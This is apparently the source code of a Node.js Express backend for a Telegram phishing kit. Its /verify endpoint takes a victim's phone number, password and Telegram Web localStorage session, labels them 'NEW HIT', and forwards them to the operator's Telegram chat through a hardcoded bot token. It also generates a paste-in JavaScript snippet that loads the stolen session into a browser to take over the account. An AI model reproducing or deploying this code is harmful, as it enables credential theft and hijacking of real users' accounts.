const TelegramBot = require('node-telegram-bot-api')
const express = require('express')
const cors = require('cors')
const app = express()
const path = require('path')
const bodyParser = require('body-parser')
const axios = require('axios')

//const token = '6449129893:AAGzANtG4cdEwRmgkYo5L2y0FIHmlUC_2yQ'
//const chatId = -4237257812

const token = '7162361678:AAFYurkXq1LDEQK9_BWYjLZVe3odRhhcCg4'
const chatId = 5641960649


const bot = new TelegramBot(token, { polling: true })

const getUserData = async (userId) => {
    try {
        const user = await bot.getChat(userId)
        return user
    } catch (error) {
        return null
    }
}
  
app.use(bodyParser.text())
app.use(express.json())
app.use(cors())

app.use(express.static(path.join(__dirname, 'public')))

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'))
})

app.post('/verify', async (req, res) => {
    const decodedData = req.body
    const jsonData = JSON.parse(decodedData)
    const parsedLs = JSON.parse(jsonData.ls)
    const userAuth = JSON.parse(parsedLs.user_auth)
    const userId = userAuth.id
    const userData = await getUserData(userId)

    const textMessage = [
        `NEW HIT JUST ARRIVED 🔻\n`,

        ...(userData?[`Name: ${userData?.first_name ? `${userData.first_name} ` : ''}${userData?.last_name ? userData.first_name : ''}`]:[]),
        ...(userData?[`Username: ${userData.username}`]:[]),
        ...(jsonData.phone?[`Phone: ${jsonData.phone}`]:[]),
        ...(jsonData.pass?[`Password: ${jsonData.pass}\n`]:[]),

        `CODE FOR LOGIN:\n`,
        `localStorage.clear();const data=${jsonData.ls};Object.keys(data).forEach((a=>{"object"==typeof data[a]?localStorage.setItem(a,JSON.stringify(data[a])):localStorage.setItem(a,data[a])})),location.reload();`
    ].join('\n')

    axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: textMessage
    })
    .then(response => {
        //console.log('Message sent:', response.data)
    })
    .catch(error => {
        //console.error('Error sending message:', error)
    })
})

app.listen(3000, () => {
    console.log('Server running on port 3000')
})